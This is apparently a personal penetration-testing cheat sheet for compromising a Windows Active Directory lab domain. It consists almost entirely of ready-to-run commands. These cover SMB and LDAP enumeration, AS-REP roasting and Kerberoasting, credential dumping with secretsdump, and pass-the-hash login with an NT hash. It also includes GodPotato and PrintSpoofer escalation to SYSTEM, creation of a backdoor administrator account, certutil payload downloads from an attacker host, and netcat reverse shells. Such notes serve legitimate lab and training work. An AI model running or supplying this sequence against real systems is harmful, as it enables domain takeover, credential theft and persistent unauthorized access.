smb ports - 139(older, netbios), 445(tcp)

ldap port - 389

winrm port - 5985

1. nmap -A <ip>
2. netexec smb <ip> -u ‘’ -p ‘’

—shares, —users

1. smbclient //ip/ share -N (-U username)
2. ldapsearch -x -H ldap://ip -b “dc=domain,dc=local”
3. as-rep

impacket-GetNPUsers domain.local -no-pass -usersfile usrs.txt -dc-ip <ip>

1. kerberoasting

impacket-GetUserSPNs domain.local/user:pass -request -dc-ip <ip>

1. evil-winrm -i IP -u user -p pass

getting user list:

ldapsearch -x -H ldap://192.168.56.20 \

- b "DC=PENTESTLAB,DC=local" \
"(objectClass=user)" \

sAMAccountName | grep "^sAMAccountName:" | awk '{print $2}'

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe

1. impacket-secretsdump PENTESTLAB.local/svc_backup:Password1@192.168.56.20
2. smbclient [//192.168.56.20/C$](https://192.168.56.20/C$) -U "Administrator" --pw-nt-hash b817733bdc947930b700cc2e567fb3ad

`PrintSpoofer.exe -i -c cmd`

.\GodPotato-NET4.exe -cmd "cmd /c whoami”

# Or via PowerShell on target:

iwr http://<your_IP>:8080/GodPotato-NET4.exe -OutFile GodPotato.exe
certutil -urlcache -f http://<your_IP>:8080/GodPotato-NET4.exe GodPotato.exe

# ── STEP 4a: GODPOTATO (recommended — works on most OS) ─

.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Users\Public\out.txt && type C:\Users\Public\out.txt"

# Add admin user:

.\GodPotato-NET4.exe -cmd "cmd /c net user hacker Password123! /add"
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators hacker /add"

# Reverse shell:

.\GodPotato-NET4.exe -cmd "cmd /c nc.exe <your_IP> 4444 -e cmd"

# ── STEP 4b: PRINTSPOOFER (Windows 10 / Server 2019) ───

.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c powershell
.\PrintSpoofer64.exe -c "cmd /c whoami"

# Reverse shell:

.\PrintSpoofer64.exe -c "cmd /c nc.exe <your_IP> 4444 -e cmd"

# ── STEP 5: CATCH REVERSE SHELL ON KALI ────────────────

nc -lvnp 4444

# Confirm SYSTEM:

whoami

# nt authority\system ✅

# Impacket (GetUserSPNs, GetNPUsers, psexec, wmiexec, secretsdump)

pip3 install impacket

# crackmapexec

pip3 install crackmapexec

# evil-winrm

gem install evil-winrm

# enum4linux-ng

apt install enum4linux-ng -y

# ldap-utils (ldapsearch)

apt install ldap-utils -y

# hashcat

apt install hashcat -y

# GodPotato — download from GitHub releases

wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe

# PrintSpoofer — download from GitHub releases

wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe

# winPEAS — download from GitHub releases

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# rockyou wordlist (if not present)

gunzip /usr/share/wordlists/rockyou.txt.gz

## reverse shell with godpotato

cd /usr/share/windows-binaries/

python3 -m http.server 80

certutil -urlcache -split -f http://192.168.56.101/nc.exe nc.exe

.\GodPotato-NET4.exe -cmd "cmd /c nc.exe -e cmd 192.168.56.101 4444”

nc -lvnp 4444

takeown /F C:\DCSync_Proof /R
icacls C:\DCSync_Proof /grant SYSTEM:F /T
type C:\DCSync_Proof\flag.txt
